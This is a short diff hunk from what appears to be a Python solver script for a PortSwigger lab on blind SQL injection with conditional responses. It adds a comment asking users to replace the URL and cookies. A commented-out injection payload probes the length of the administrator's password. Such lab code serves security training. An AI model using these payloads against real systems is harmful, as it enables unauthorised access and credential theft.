@@ -1,5 +1,5 @@
 # https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses
-
+# Be sure to replace the URL, the Session Cookie and the Tracking ID cookie with your own.
 import requests
 import string
 #Mquery = """' AND (SELECT 'PPPP' FROM users WHERE username='administrator' and Length(password)>1 )='PPPP"""
